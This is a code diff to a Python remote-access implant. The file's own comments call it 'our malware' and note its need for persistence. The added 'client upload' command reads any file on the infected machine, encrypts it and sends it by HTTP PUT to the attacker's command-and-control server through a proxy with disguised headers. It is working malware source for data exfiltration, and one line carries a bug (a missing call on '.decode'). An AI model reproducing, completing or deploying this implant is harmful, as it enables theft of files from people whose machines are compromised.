@@ -98,6 +98,35 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
+    # The "client upload FILENAME" command allows us to push files from the client to our c2 server
+    elif command.startswith("client upload"):
+
+        # Initialize filepath in order to get rid of an warning
+        filepath = None
+
+        try:
+            # Split out the filepath
+            filepath = command.split()[2]
+
+            # Split out the filename from the end of the filepath or if only a filename was supplied, use it
+            filename = filepath.rsplit("/", 1)[-1]
+
+            # Byte encode the filename first to be able to encrypt it, but then we must decode it after the encryption
+            encrypted_filename = cipher.encrypt(filename.encode()).decode
+
+            print("filename: ", filename)
+            print("encrypted_filename: ", encrypted_filename)
+
+            # Read the file in and use it as the data argument for an HTTP PUT request to our c2 server
+            with open(filepath, "rb") as file_handle:
+                encrypted_file = cipher.encrypt(file_handle.read())
+                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, proxies=PROXY, headers=HEADER)
+        
+        except IndexError:
+            post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
+
     # The "client kill" command will shut down our malware; make sure we have persistance!
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been killed.\n")
